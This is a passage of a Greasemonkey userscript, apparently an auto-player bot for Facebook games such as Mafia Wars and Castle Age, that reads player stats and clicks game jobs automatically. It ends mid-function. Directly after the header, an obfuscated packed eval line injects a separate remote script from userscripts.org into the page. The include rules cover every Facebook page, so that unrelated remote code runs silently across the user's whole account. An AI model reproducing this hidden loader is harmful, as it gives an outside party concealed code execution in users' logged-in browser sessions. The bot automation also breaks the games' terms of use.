// ==UserScript==
// @name           zynga games Plus + Last Update
// @namespace      zynga
// @description    Auto player for zynga games on facebook: space wars, football, heroes & villains, special forces, fashion wars, dragon wars, mafia wars, vampires, gang wars, street racing, pirates, castle age, school of magic, prison lockdown, glamour age, under world, age of chivalry, heist, demon wars, soldiers, pocket battles, super powers, drinking wars, green game, sorcerer of darkness, slamdunk, be popular, warlords, blood hunters, celebrity life, realm of shadows, protectors of fortuna, guardians of light, wrath of ninjas, Mafioso war, robin hood, fashionista, secret agents, moon light
// @include        http://apps*.facebook.com/*/jobs.php*
// @include        http://apps*.facebook.com/*/bank.php*
// @include        http://apps*.facebook.com/*/hospital.php*
// @include        http://apps*.facebook.com/*/fight.php*
// @include        http://apps*.facebook.com/*/properties.php*
// @include        http://apps*.facebook.com/*/actions
// @include        http://apps*.facebook.com/*/banking
// @include        http://apps*.facebook.com/*/fight
// @include        http://apps*.facebook.com/*/invest
// @include        http://apps.*facebook.com/inthemafia/*
// @include        http://apps.*facebook.com/footballwars/*
// @include        http://apps.*facebook.com/spacewarsgame/*
// @include        http://apps.*facebook.com/specialforces/*
// @include        http://apps.*facebook.com/heroesvillains/*
// @include        http://apps.*facebook.com/piratesrule/*
// @include        http://apps.*facebook.com/streetracinggame/*
// @include        http://apps.*facebook.com/castle_age/*
// @include        http://apps.*facebook.com/glamour_age/*
// @include        http://apps.*facebook.com/gangwarsgame/*
// @include        http://apps.*facebook.com/fashionwarsgame/*
// @include        http://apps.*facebook.com/prisonlockdowngame/*
// @include        http://apps.*facebook.com/under_world/*
// @include        http://apps.*facebook.com/secretagents/*
// @include        http://apps.*facebook.com/itsfashion/*
// @include        http://apps.*facebook.com/mafiosowar/*
// @include        http://apps.*facebook.com/robhood/*
// @include		   http://www.facebook.com/common/error.html
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// disabled @require        http://usocheckup.dune.net/index.php?scriptid=44038

// disable fastLoad if the computer is slow or many games are running at the same time.
var fastLoad=true;
var debug=true;

// update script from: http://userscripts.org/scripts/review/20145

var SUC_script_num = 44038; // Change this to the number given to the script by userscripts.org (check the address bar)
try{function updateCheck(forced){if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + (86400000*7) <= (new Date().getTime()))){try{GM_xmlhttpRequest({method: 'GET',url: 'http://userscripts.org/scripts/source/'+SUC_script_num+'.meta.js?'+new Date().getTime(),headers: {'Cache-Control': 'no-cache'},onload: function(resp){var local_version, remote_version, rt, script_name;rt=resp.responseText;GM_setValue('SUC_last_update', new Date().getTime()+'');remote_version=parseInt(/@uso:version\s*(.*?)\s*$/m.exec(rt)[1]);local_version=parseInt(GM_getValue('SUC_current_version', '-1'));if(local_version!=-1){script_name = (/@name\s*(.*?)\s*$/m.exec(rt))[1];GM_setValue('SUC_target_script_name', script_name);if (remote_version > local_version){if(confirm('There is an update available for the Greasemonkey script "'+script_name+'."\nWould you like to go to the install page now?')){GM_openInTab('http://userscripts.org/scripts/show/'+SUC_script_num);GM_setValue('SUC_current_version', remote_version);}}else if (forced)alert('No update is available for "'+script_name+'."');}else GM_setValue('SUC_current_version', remote_version+'');}});}catch (err){if (forced)alert('An error occurred while checking for updates:\n'+err);}}}GM_registerMenuCommand(GM_getValue('SUC_target_script_name', '???') + ' - Manual Update Check', function(){updateCheck(true);});updateCheck(false);}catch(err){}


if(!GM_log) {
	GM_log=console.debug;
}


/*

Becareful of the auto deposit, in some games you can click on the money and the bank screen will come up quickly.  When you have auto deposit enabled it may seem like the money is disappearing straight away.

*/

String.prototype.trim = function() { return this.replace(/^\s+|\s+$/g, ''); }

var nHtml={
FindByAttrContains:function(obj,tag,attr,className) {
	if(attr=="className") { attr="class"; }
	var q=document.evaluate(".//"+tag+
		"[contains(@"+attr+",'"+className+
		"')]",obj,null,
		XPathResult.FIRST_ORDERED_NODE_TYPE,null);
	if(q && q.singleNodeValue) { return q.singleNodeValue; }
	return null;
},
FindByAttrXPath:function(obj,tag,className) {
	var q=null;
	try {
		var xpath=".//"+tag+"["+className+"]";
		if(obj==null) {
			GM_log('Trying to find xpath with null obj:'+xpath);
			return null;
		}
		q=document.evaluate(xpath,obj,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);
	} catch(err) {
		GM_log("XPath Failed:"+xpath+","+err);
	}
	if(q && q.singleNodeValue) { return q.singleNodeValue; }
	return null;
},
FindByAttr:function(obj,tag,attr,className) {
	if(className.exec==undefined) {
		if(attr=="className") { attr="class"; }
		var q=document.evaluate(".//"+tag+"[@"+attr+"='"+className+"']",obj,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);
		if(q && q.singleNodeValue) { return q.singleNodeValue; }
		return null;
	}
	var divs=obj.getElementsByTagName(tag);
	for(var d=0; d<divs.length; d++) {
		var div=divs[d];
		if(className.exec!=undefined) {
			if(className.exec(div[attr])) {
				return div;
			}
		} else if(div[attr]==className) {
			return div;
		}
	}
	return null;
},
FindByClassName:function(obj,tag,className) {
	return this.FindByAttr(obj,tag,"className",className);
},


FindParent:function(obj,func) {
	var p=obj.parentNode;
	while(p.tagName!="BODY") {
		if(func(p)) { return p; }
		p=p.parentNode;
	}
	return undefined;
},

VisitUrl:function(url) {
	this.setTimeout(function() {
		if(url.indexOf("violations.php")>=0) {
			GM_log("Huh? we clicked on the voilations url:"+url);
			return;
		}

		document.location.href=url;
	},1000+Math.floor(Math.random()*1000));
},

Click2:function(obj,evtName) {
	var evt = document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, window,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
},
ClickNoWait:function(obj) {
//	this.Click2(obj,"mousedown");
//	this.Click2(obj,"mouseup");
	this.Click2(obj,"click");
},
Click:function(obj) {
	this.setTimeout(function() {
		nHtml.ClickNoWait(obj);
	},1000+Math.floor(Math.random()*1000));
},
spaceTags:{
	'td':1,
	'br':1,
	'hr':1,
	'span':1,
	'table':1
},
GetText:function(obj) {
	var txt=' ';
	if(obj.tagName!=undefined && this.spaceTags[obj.tagName.toLowerCase()]) {
		txt+=" ";
	}
	if(obj.nodeName=="#text") { return txt+obj.textContent; }
	for(var o=0; o<obj.childNodes.length; o++) {
		var child=obj.childNodes[o];
		txt+=this.GetText(child);
	}
	return txt;
},

htmlRe:new RegExp('<[^>]+>','g'),
StripHtml:function(html) {
	return html.replace(this.htmlRe,'').replace(/&nbsp;/g,'');
},

timeouts:{},
setTimeout:function(func,millis) {
	var t=window.setTimeout(function() {
		func();
		nHtml.timeouts[t]=undefined;
	},millis);
	this.timeouts[t]=1;
},
clearTimeouts:function() {
	for(var t in this.timeouts) {
		window.clearTimeout(t);
	}
	this.timeouts={};
}

};


Zynga={
stats:{},
totalJobs:0,
lastReload:new Date(),
autoReloadMilliSecs:15*60*1000,

staminaRe:new RegExp('([0-9\\.]+)\\s*/\\s*([0-9]+)','i'),
htmlJunkRe:new RegExp("\\&[^;]+;","g"),
energyRe:new RegExp("([0-9]+)\\s+(energy|gas)","i"),
gameNameRe:new RegExp("^/([^/]+)/"),
experienceRe:new RegExp("\\+([0-9]+)"),
//experience2Re:new RegExp("experience:\\s+\\+?([0-9]+)",'i'),
gainLevelRe:new RegExp("gain\\s+level\\s+([0-9]+)\\s+in","i"),
moneyRe:new RegExp("\\$([0-9,]+)\\s*-\\s*\\$([0-9,]+)","i"),
firstNumberRe:new RegExp("([0-9]+)"),
gameName:null,

GameName:function() {
	if(this.gameName!=null) { return this.gameName; }
	var m=this.gameNameRe.exec(window.location.pathname);
	if(m) { 
		this.gameName=m[1];
		return m[1]; 
	}
	GM_log('Error unknown game:'+window.location.pathname);
	return null;
},

GMLog:function(mess) {
	GM_log(this.GameName()+":"+mess);
},
GMDebug:function(mess) {
	if(debug) { this.GMLog(mess); }
},

GMSetValue:function(n,v) {
	return GM_setValue(this.GameName()+"__"+n,v);
},
GMGetValue:function(n,v) {
	return GM_getValue(this.GameName()+"__"+n,v);
},


VisitUrl:function(href) {
	this.waitMilliSecs=10000;
	nHtml.VisitUrl(href);
},
Click:function(button) {
	this.waitMilliSecs=10000;
	nHtml.Click(button);
},
RunScript:function(scr,clickWait) {
		nHtml.setTimeout(function() { 
			var s=document.createElement('script');		
			var fname="aaa"+Math.floor(Math.random()*1000000);
			s.innerHTML='function '+fname+'(event) { \n'+scr+"  \n}\n "+fname+"({});";
			document.body.appendChild(s);
		},clickWait);
},

//////////////////////////////

NumberOnly:function(num) {
	var numOnly=parseFloat(num.replace(/[^0-9\.]/g,""));
	return numOnly;
},
RemoveHtmlJunk:function(html) {
	return html.replace(this.htmlJunkRe,'');
},

GetStatusNumbers:function(node) {
	var txt=nHtml.GetText(node);
	var staminam=this.staminaRe.exec(txt);
	if(staminam) {
		return {'num':parseInt(staminam[1]),'max':parseInt(staminam[2])};
	} else {
		this.GMLog('Cannot find status:'+txt);
	}
	return null;
},
GetStats:function() {
	this.stats={};
	var isKidsGame=this.IsKidsGame();
	
	// health
	var health=nHtml.FindByAttrContains(document.body,"span","id",'_current_health');
	var healthMess='';
	if(!health) {
		// mafia wars in bank page.
		health=nHtml.FindByAttrContains(document.body,"span","id",'_user_health');
	}
	if(!health) {
		// school of magic
		health=nHtml.FindByAttrContains(document.body,"span","className",'health');
		if(health) { health=health.parentNode; }
	}
	if(!health) {
		health=nHtml.FindByAttrXPath(document.body,'span',"contains(@id,'_health') and not(contains(@id,'health_time'))");
		//health=nHtml.FindByAttrContains(document.body,"span","id",'_health');
	}
	if(health!=null) {
		this.stats['health']=this.GetStatusNumbers(health.parentNode);
		if(this.stats.health) {
			healthMess="Health: "+this.stats.health.num;
		}
	} else {
		this.GMLog('Could not find health');
		this.waitMilliSecs=5000;
	}
	
	
	// stamina
	var stamina=nHtml.FindByAttrContains(document.body,"span","id",'_current_stamina');
	var staminaMess='';
	if(!stamina && isKidsGame) {
		stamina=nHtml.FindByAttrContains(document.body,"span","id",'_header_recovery');
	}
	if(!stamina) {
		// school of magic
		stamina=nHtml.FindByAttrContains(document.body,"span","className",'stamina');
		if(stamina) { stamina=stamina.parentNode; }
	}
	if(!stamina) {
		stamina=nHtml.FindByAttrXPath(document.body,'span',"contains(@id,'_stamina') and not(contains(@id,'stamina_time'))");
		//stamina=nHtml.FindByAttrContains(document.body,"span","id",'_stamina');
	}
	if(stamina!=null) {
		this.stats['stamina']=this.GetStatusNumbers(stamina.parentNode);
		if(this.stats.stamina) {
			staminaMess="Stamina: "+this.stats.stamina.num;
		}
	} else {
		this.GMLog('Could not find stamina');
		this.waitMilliSecs=5000;
	}

	var energyMess='';
	// castle age...
	var energy=nHtml.FindByAttrContains(document.body,"span","id",'_current_energy');
	if(!energy) {
		// kids games
		energy=nHtml.FindByAttrXPath(document.body,'span',"contains(@id,'header_energy')");
	}
	if(!energy) {
		energy=nHtml.FindByAttrXPath(document.body,'span',"contains(@id,'_energy') and not(contains(@id,'energy_time'))");
	}
	if(!energy) {
		// school of magic
		energy=nHtml.FindByAttrContains(document.body,"span","className",'energy');
		if(energy) { energy=energy.parentNode; }
	}
	if(energy!=null) {
		this.stats['energy']=this.GetStatusNumbers(energy.parentNode);
		if(this.stats.energy!=null) {
			energyMess="Energy: "+this.stats.energy.num;
		}
	} else {
		this.GMLog('Could not find energy');
		this.waitMilliSecs=5000;
	}

	// special forces(..._user_cash)
	var cashObj=nHtml.FindByAttrContains(document.body,"span","id",'_user_cash');
	if(!cashObj && isKidsGame) {
		// robhood,etc.
		cashObj=nHtml.FindByAttrContains(document.body,"span","id",'header_cash');
	}
	if(!cashObj) {
		// vampire wars.
		cashObj=nHtml.FindByAttrContains(document.body,"div","id",'_current_cash');
	}
	if(!cashObj) {
		// schoolofmagic
		cashObj=nHtml.FindByAttrContains(document.body,"span","id",'_cur_money');
	}

	if(!cashObj && this.IsVikingGame()) {
		// viking clan
		cashObj=nHtml.FindByAttrContains(document.body,"span","id",'_cash');
	}
	if(!cashObj) {
		// piratesrule
		cashObj=nHtml.FindByAttrContains(document.body,"a","href",'nav=status_button_cash');
		if(cashObj) { cashObj=cashObj.parentNode; }
	}
	
	if(!cashObj) {
		cashObj=nHtml.FindByClassName(document.body,"strong","money");
	}
	if(!cashObj) {
		// school of magic
		cashObj=nHtml.FindByAttrContains(document.body,"span","className",'money');
		if(cashObj) {
			cashObj=cashObj.parentNode.parentNode;
		}
	}
	if(!cashObj || this.GameName()=="streetracinggame") {
		// streetracinggame
		cashObj=nHtml.FindByAttrXPath(document.body,"strong","contains(string(),'$')");
	}
	var numberRemoveRe=new RegExp('\\s*([0-9,\\s*]+)\\s*\\S+');
	if(cashObj) {
		var cashTxt=nHtml.GetText(cashObj);
		if(this.IsVikingGame()) {
			var m=numberRemoveRe.exec(cashTxt);
			if(m && m.length>0) {
				cashTxt=m[1];
			}
		}
		var cash=this.NumberOnly(cashTxt);
		this.stats.cash=cash;
		
		var moneyMessDiv=document.getElementById('autozynga_money_mess');
		if(moneyMessDiv) { moneyMessDiv.innerHTML="Money $"+cash+" "+staminaMess+" "+healthMess+" "+energyMess; }
	} else {
		this.GMLog('Could not find cash');
	}
},

SetMessage:function(mess) {
	this.SetupDivs();
	var d=document.getElementById('autozynga_mess');
	if(d) { d.innerHTML=mess; }
},
SetFightMessage:function(mess) {
	this.SetupDivs();
	var d=document.getElementById('autozynga_fight_mess');
	if(d) { d.innerHTML=mess; }
},
SetHospitalMessage:function(mess) {
	this.SetupDivs();
	var d=document.getElementById('autozynga_hospital_mess');
	if(d) { d.innerHTML=mess; }
},

SetJobControl:function(mess) {
	this.SetupDivs();
	var d=document.getElementById('autozynga_job_control');
	if(d) { d.innerHTML=mess; }
},
SetControl:function(mess) {
	this.SetupDivs();
	var d=this.GetControlDiv();
	if(d) { d.innerHTML=mess; }
},
GetControlDiv:function() {
	return document.getElementById('autozynga_control');
},

SetupDivs:function() {
	if(document.getElementById('autozynga_div')) {
		return false;
	}
	var div=document.createElement('div');
	div.id='autozynga_div';
	div.style.padding='4px';
	div.style.border='2px solid #444';
	div.style.background='#fff';
	div.style.color='#000';

	var controlDiv=document.createElement('div');
	controlDiv.id='autozynga_control';
	var jobControlDiv=document.createElement('div');
	jobControlDiv.id='autozynga_job_control';

	var messDiv=document.createElement('div');
	messDiv.id='autozynga_mess';
	var moneyMessDiv=document.createElement('div');
	moneyMessDiv.id='autozynga_money_mess';
	var fightMessDiv=document.createElement('div');
	fightMessDiv.id='autozynga_fight_mess';
	var hospitalMessDiv=document.createElement('div');
	hospitalMessDiv.id='autozynga_hospital_mess';

	div.appendChild(messDiv);
	div.appendChild(fightMessDiv);
	div.appendChild(moneyMessDiv);
	div.appendChild(hospitalMessDiv);
	div.appendChild(jobControlDiv);
	div.appendChild(controlDiv);

	var b=document.getElementById('sidebar_ads');
	if(b) {
		b.parentNode.insertBefore(div,b.parentNode.childNodes[0]);
	} else {
	
		var app=document.getElementById('fb_sell_profile');
		if(!app) {
			app=nHtml.FindByAttr(document.body,'div','className','app');
		}
		if(!app) {
			app=nHtml.FindByAttr(document.body,'div','id',/^app.*header$/);
		}
		if(app) {
			if(app.parentNode.parentNode) {
				// some ajax games won't reload before the app's area, let's insert the div there.
				app.parentNode.parentNode.insertBefore(div,app.parentNode);
			} else {
				app.insertBefore(div,app.childNodes[0]);
			}
		} else {
			this.GMLog('cannot find app div');
		}
	}

	return true;
},


IsVikingGame:function() {
	var pathname=location.pathname;
	if(pathname.substring(pathname.length-7)=="/quests" || pathname.substring(pathname.length-7)=="/battle") {
		return true;
	}
	return false;
},

IsOldGame:function() {
	var pathname=location.pathname;
	if(pathname.substring(pathname.length-8)=="/actions" 
	|| pathname.substring(pathname.length-6)=="/fight"
	|| pathname.substring(pathname.length-8)=="/banking"
	|| pathname.substring(pathname.length-7)=="/invest"
	) {
		return true;
	}
	return false;
},

kidsGames:{
	'mafiosowar':1,
	'robhood':1,
	'itsfashion':1,
	'secretagents':1
},
IsKidsGame:function() {
	var gameName=this.GameName();
	if(this.kidsGames[gameName]) { return true; }
	return false;
},

//////////////////////////

GetJobs:function() {
	var jobs={};
	var gameName=this.GameName();

	// job_list = mafia wars, football, pirates
	// main = dragon wars
	// action_table = heist, ageofchivalry, etc.
	var job_list=nHtml.FindByAttr(document.body,"table","className",'job_list');
	var jobLists=[];
	if(!job_list) {
		job_list=nHtml.FindByAttr(document.body,"table","className",'main');
		if(!job_list) {
			// castle age
			job_list=nHtml.FindByAttr(document.body,"table","className",'quests_layout');
		}
		if(!job_list) {
			// 
			job_list=nHtml.FindByAttrContains(document.body,"div","id",'_jobsDiv');
		}

		if(!job_list) {
			var job_list=nHtml.FindByAttr(document.body,"table","className",'action_table');
			if(job_list) {
				job_list=job_list.parentNode.parentNode;
			}
		}
		jobLists=[job_list];
		if(!job_list) { return jobs; }
	} else {
		// problem with mafia wars putting empty job_list tables before the real one.
		var ss=document.evaluate(".//table[@class='job_list']",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
		for(var s=0; s<ss.snapshotLength; s++) {
			jobLists.push(ss.snapshotItem(s));
		}
	}

	var isKidsGame=this.IsKidsGame();
	for(var joblistUpto=0; joblistUpto<jobLists.length; joblistUpto++) {
		var job_list=jobLists[joblistUpto];

		var trs=job_list.getElementsByTagName('tr');
		
		var jobsAdded=0;
		for(var t=0; t<trs.length; t++) {
			var tr=trs[t];
			if(isKidsGame) {
				if(tr.className!='normal_row') { continue; }
				parentTd=tr;
			} else {
				parentTd=tr.parentNode;
				while(parentTd && (parentTd.tagName==undefined || parentTd.tagName.toUpperCase()!="TD")) {
					parentTd=parentTd.parentNode;
				}
			}

			if((parentTd && parentTd.className=="requirements")
			|| tr.parentNode.parentNode.className=="borderless") { 
				// ignore tables of required items.
				continue;
			}
			// dragon wars: img, name + reward, energy + required, submit
			// football, mafia wars, pirates: name + img, reward, energy, required, submit


			var tds=[];
			for(var subTd=0; subTd<tr.childNodes.length; subTd++) {
				var td=tr.childNodes[subTd];
				if(td.tagName==undefined || td.tagName.toLowerCase()!="td") {
					continue;
				}
				tds.push(td);
			}

			if(this.IsOldGame()) {
				if(tds.length<3) { continue; }
			} else if(gameName=="piratesrule") {
				if(!nHtml.FindByAttr(tr,"div","className","job_title")) {
					continue;
				}
			} else if(gameName=="castle_age" || gameName=="glamour_age" || gameName=="under_world") {
				if(!nHtml.FindByAttr(tr,"div","className","quest_desc")) {
					continue;
				}
			}else if(tds.length<4) {
				continue;
			}

			// check for disabled_text in fashion wars
			var disabled=nHtml.FindByAttr(tr,'strong','className','disabled_text');
			if(disabled) { continue; }

			var job_name=null;
			var reward=null;
			var energy=null;
			var experience=null;
			var trTxt=nHtml.GetText(tr);

			if(this.gainLevelRe.exec(trTxt)) {
				// ignore gain level in another game..
				continue;
			}
			for(var tdUpto=0; tdUpto<tds.length; tdUpto++) {
				var td=tds[tdUpto];

				if(td.className=="job_name") {
					if(isKidsGame) {
						var divs=document.evaluate(".//div[not(contains(@class,'autojob'))]",td,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
						if(divs.snapshotLength>2) {
							job_name=divs.snapshotItem(1).innerHTML.trim();
						}
					} else {
						job_name=td.innerHTML.toString().trim();
						// has <td class='job_name'><div class='job_title'>: gang wars
						var item_title=nHtml.FindByAttrXPath(td,'div',"@class='quest_desc' or @class='race_name' or @class='item_title' or @class='job_title'");
						if(item_title)
							job_name=item_title.innerHTML;
					}
				} else if(td.className=="job_energy" || td.className.indexOf('req_value')>=0) {

					var tdTxt=nHtml.GetText(td);

					var m=this.energyRe.exec(tdTxt);
					if(m) {
						energy=this.NumberOnly(m[1]);
					} else {
						energy=this.NumberOnly(tdTxt);
					}
				}
			}

			var expM=this.experienceRe.exec(trTxt);
			if(expM) { experience=this.NumberOnly(expM[1]); }
			else {
				var expObj=nHtml.FindByAttr(tr,'div','className','job_experience');
				if(expObj) {
					experience=(this.NumberOnly(nHtml.GetText(expObj)));
				} else {
					this.GMLog('cannot find experience:'+job_name);
				}
			}

			if(job_name==null) {
				// school of magic, special forces, streetracing, castle_age
				var item_title=nHtml.FindByAttrXPath(tr,'div',"@class='quest_desc' or @class='race_name' or @class='item_title' or @class='job_title'");
				if(item_title) {
					if(item_title.className=="quest_desc") {
						item_title=item_title.getElementsByTagName('b')[0];
					}
					job_name=nHtml.StripHtml(item_title.innerHTML.toString()).trim();
				}
			}
			if(job_name==null) {
				// dragon wars.
				var jbObj=tr.getElementsByTagName('strong')[0];
				if(jbObj) {
					job_name=nHtml.GetText(jbObj).trim();
				}
			}

			if(!job_name) {
				this.GMLog('no job name for this row'+tr.innerHTML);
				continue;
			}

			// some game has other junk after job name.
			if((idx=job_name.indexOf('<br>'))>=0) {
				job_name=job_name.substring(0,idx);
			}

			
			if(energy==null) {
				// dragonwars
				var m=this.energyRe.exec(nHtml.GetText(tr));
				if(m) {
					energy=m[1];
				}
			}
			if(!energy) {
				// school of magic
				var eObj=nHtml.FindByAttrContains(tr,'span','className','energy');
				if(eObj) {
					var fm=this.firstNumberRe.exec(nHtml.GetText(eObj.parentNode));
					if(fm) {
						energy=this.NumberOnly(fm[1]);
					}
				}
			}
			if(!energy) {
				this.GMLog('cannot find energy for job:'+job_name);
				continue;
			}

			var moneyTxt=null;
			var moneyObj=nHtml.FindByAttr(tr,"span","className","money");
			if(!moneyObj) {
				moneyObj=nHtml.FindByAttr(tr,"b","className","money");
			}
			// specialforces
			if(!moneyObj) { moneyObj=nHtml.FindByAttr(tr,"div","className","job_money"); }
			// castle_age
			if(!moneyObj) {
				var m=this.moneyRe.exec(this.RemoveHtmlJunk(trTxt));
				if(m!=null && m.length>0) {
					moneyTxt=m[0];
					moneyObj=tr;
				}
			}
			if(!moneyObj) {
				// school of magic
				moneyObj=nHtml.FindByAttrContains(tr,"span","className",'payout');
				if(moneyObj) {
					moneyObj=moneyObj.parentNode;
				}
			}

			if(moneyObj!=null) {
				if(moneyTxt==null) {
					moneyTxt=nHtml.GetText(moneyObj);
				}
				reward=this.RemoveHtmlJunk(moneyTxt);
				reward=reward.replace(/[\\$g]/g,'');
				// weird minus sign here, prisonlockdown
				var ra=reward.split(/[\-\‑]/);
				if(ra.length==2) {
					var rewardLow=this.NumberOnly(ra[0]);
					var rewardDiff=this.NumberOnly(ra[1])-rewardLow;

					reward=rewardLow+(rewardDiff/2);
				} else {
					reward=this.NumberOnly(reward);
				}
			} else {
				this.GMLog('no money found:'+job_name);
			}
			if(!reward) {
				this.GMLog('cannot find reward for job: '+job_name);
			}
			// vampire wars
			var a=nHtml.FindByAttrContains(tr,"a","href",'action=dojob');
			if(!a)
				a=nHtml.FindByAttrContains(tr,"a","href",'action=doJob');
			if(!a && isKidsGame) {
				a=nHtml.FindByAttrContains(tr,"a","onclick",'_jobs_doJob');
			}
			if(!a) {
				a=nHtml.FindByAttr(tr,"input","name","Job Submit");
			}
			if(!a) {
				// inthemafia
				a=nHtml.FindByAttrContains(tr,"a","onclick","tryDoJob");
			}
			if(!a) {
				// moon_light
				a=nHtml.FindByAttrContains(tr,"input","onclick","/Action/Do");
			}
			if(!a) {
				// school of magic
				a=nHtml.FindByAttr(tr,"input","value",/^Do/);
			}
			if(!a) {
				// castle_age
				a=nHtml.FindByAttr(tr,"input","type",'image');
			}
			if(!a) {
				this.GMDebug('Cannot find A tag for job:'+job_name);
				continue;
			}
			jobs[job_name]={
				'click':a,'tr':tr,
				'energy':energy,'reward':reward,
				'experience':experience
			};
			jobsAdded++;
		}
		/*
		if(gameName=="piratesrule") {
			continue;
		}
		*/
		//if(jobsAdded>0) { break; }
	}

	return jobs;
},
SetAutoJob:function(job_name,job_energy) {
	this.GMSetValue('AutoJob',job_name);
	this.GMSetValue('AutoJobEnergy',job_energy);
},
GetAutoJob:function() {
	var name=this.GMGetValue('AutoJob','');
	var energy=parseInt(this.GMGetValue('AutoJobEnergy',0));
	return { 'name':name,'energy':energy};
},

IsEnoughEnergyForAutoJob:function() {
	var waitTillFull=this.GMGetValue('WaitTillFull',0);
	var autoJobObj=this.GetAutoJob();
	if(!this.stats.energy) { return false; }
	if(!waitTillFull) {
		if(autoJobObj.energy>0 && this.stats.energy.num>=autoJobObj.energy) {
			return true;
		}
	} else if(this.stats.energy.num>=(this.stats.energy.max-1)) {
		return true;
	}
	return false;
},

DrawJobs:function(jobs,enableAutoJob) {
	if(jobs==null) { jobs=this.GetJobs(); }

	var gameName=this.GameName();
	if(this.IsOldGame() && location.href.indexOf('/actions')<0) {
		return;
	}
	var autoJobObj=this.GetAutoJob();
	for(var job_name in jobs) {
		var job=jobs[job_name];
		var x=nHtml.FindByAttr(job.tr,'div','className','autojob');
		if(x) {
			continue;
		}

		var div=document.createElement('div');
		div.className='autojob';
		div.style.fontSize='10px';
		div.innerHTML="$ per energy: "+
			(Math.floor(job.reward/job.energy*10)/10)+
			"<br />Exp per energy: "+
			(Math.floor(job.experience/job.energy*100)/100)+
			"<br />";

		if(autoJobObj.name==job_name) {
			var b=document.createElement('b');
			b.innerHTML="Current auto job";
			div.appendChild(b);
		} else if(enableAutoJob) {

			var setAutoJob=document.createElement('a');
			setAutoJob.innerHTML='Auto run this job.';
			setAutoJob.job_name=job_name;

			var job_nameObj=document.createElement('span');
			job_nameObj.innerHTML=job_name;
			job_nameObj.style.display='none';
			setAutoJob.appendChild(job_nameObj);
			
			var job_energyObj=document.createElement('span');
			job_energyObj.innerHTML=job.energy;
			job_energyObj.style.display='none';
			setAutoJob.appendChild(job_energyObj);
			setAutoJob.addEventListener("click",function(e) {
				var sps=e.target.getElementsByTagName('span');
				if(sps.length>0) {
					Zynga.SetAutoJob(sps[0].innerHTML.toString(),sps[1].innerHTML.toString());
					Zynga.Jobs();
				} else {
					this.GMLog('what did we click on?');
				}
			},false);
			div.appendChild(setAutoJob);
		}
		if(gameName=="castle_age" || gameName=="glamour_age" || gameName=="under_world") {	
			div.style.position='absolute';
			div.style.opacity=0.8;
			div.style.background='#888';
		}
		job.click.parentNode.insertBefore(div,job.click);
	}
},

Jobs:function(getPage) {
	this.totalJobs=0;

	var gameName=this.GameName();
	var jobs=this.GetJobs();
	for(var job_name in jobs) {
		this.totalJobs++;
	}

	var autoJobObj=this.GetAutoJob();
	var autoJob=autoJobObj.name;
	
	if(this.totalJobs==0) {
		if(autoJob!="") {
			if(this.IsEnoughEnergyForAutoJob()) {
				this.VisitJobPage();
				return 'GoJobs';
			}
		}
		return null;
	}
	var page='jobs';
	this.DrawJobs(jobs,true);

	//~~~ get the sub page of the job
	if(getPage) { return page; }

	if(autoJob) {
		var waitTillFull=this.GMGetValue('WaitTillFull',0);
		var job=jobs[autoJob];
		var doAutoJob=false;

		var mess='';
		if(!job) {
			this.GMLog('Could not find job: '+autoJob);
			mess+='<br />Could not find job: '+autoJob+", make sure you have clicked into the correct mission page.";
		} else if(this.IsEnoughEnergyForAutoJob()) {
			doAutoJob=true;
		}
/*
		if(!waitTillFull) {
			this.pageHasAutoJob=false;
			if(this.stats.energy.num>=job.energy) {
				this.GMLog(" energy:"+this.stats.energy.num+", max:"+this.stats.energy.max);
				doAutoJob=true;
			}
			
		} else if(this.stats.energy.num>=(this.stats.energy.max-1)) {
			this.pageHasAutoJob=false;
			this.GMLog(" energy:"+this.stats.energy.num+", max:"+this.stats.energy.max);
			doAutoJob=true;
		}
*/
		if(doAutoJob) {
			this.GMLog(': do auto job:'+autoJob);
			this.waitMilliSecs=10000;
			nHtml.setTimeout(function() {
				Zynga.Click(job.click);
			},1000);
		} else {
			this.SetMessage(mess+'Waiting for more energy:'+this.stats.energy.num+"/"+this.stats.energy.max+", job energy:"+(job?job.energy:""));
			// let's not waste the cpu if we're only waiting for the energy to recover.
			//this.waitMilliSecs=8000;
			return null;
		}
		return 'jobs';
	} else {
		this.SetMessage('');
//		this.SetControl('');
	}

	return null;
},


SetJobControls:function() {
	var controlHtml='';

	var autoJobObj=this.GetAutoJob();
	var autoJob=autoJobObj.name;
	if(autoJob) {
		controlHtml+="<a id='stopAutoJob' href='javascript:;'>Stop auto job: "+autoJob+"(energy: "+autoJobObj.energy+")"+"</a><br />"+
		"<input type='checkbox' id='WaitTillFull' />Only run when we have one less than the full energy bar.<br />";
	}
	this.SetJobControl(
		controlHtml
	);

	if(autoJob) {
		var stopA=document.getElementById('stopAutoJob');
		stopA.addEventListener('click',function() {
			Zynga.SetAutoJob('',0);
		},false);

		var waitTillFull=this.GMGetValue('WaitTillFull',0);
		var waitTillFullBox=document.getElementById('WaitTillFull');
		waitTillFullBox.checked=waitTillFull?true:false;
		waitTillFullBox.addEventListener('change',function(e) {
			Zynga.GMSetValue('WaitTillFull',e.target.checked?1:0);
		},false);
	}
},
SetControls:function() {
	this.SetJobControls();

	var controlDiv=this.GetControlDiv();
	if(controlDiv && controlDiv.innerHTML.length>0) { 
		// we already have the controls
		return; 
	}
	
	var controlHtml='';
	var bankInstructions1="Minimum cash to have on hand, press tab to save";
	var bankInstructions2="Maximum cash to have on hand, bank anything above this, press tab to save(leave blank to disable)";
	var healthInstructions="Minimum to have before we visit the hospital, press tab to save(leave blank to disable): ";
